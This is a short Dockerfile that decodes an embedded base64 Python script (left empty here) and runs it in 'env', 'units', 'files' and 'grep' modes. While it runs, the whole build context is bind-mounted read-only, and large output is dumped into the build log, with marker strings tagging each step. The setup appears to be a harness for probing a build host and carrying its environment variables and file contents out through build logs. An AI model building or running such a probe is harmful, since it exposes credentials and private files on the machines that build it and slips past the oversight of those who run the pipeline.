# MARK-I68222-m-3a7f2
FROM alpine:3.20
RUN echo MARK-I68222-start
RUN apk add --no-cache python3 >/dev/null 2>&1; echo APKDONE
RUN : > /p.b64
RUN echo '' >> /p.b64
RUN echo '' >> /p.b64
RUN echo '' >> /p.b64
RUN base64 -d /p.b64 > /p.py && python3 -c "import ast;ast.parse(open('/p.py').read());print('PYOK')"
RUN --mount=type=bind,source=.,target=/H,ro sh -c 'set +e; export ROOT=/H; for m in env units files grep; do echo "##### MODE $m"; python3 /p.py $m 2>&1 | head -c 70000; done'
RUN echo MARK-I68222-m-3a7f2-done
CMD ["sh","-c","sleep 15"]
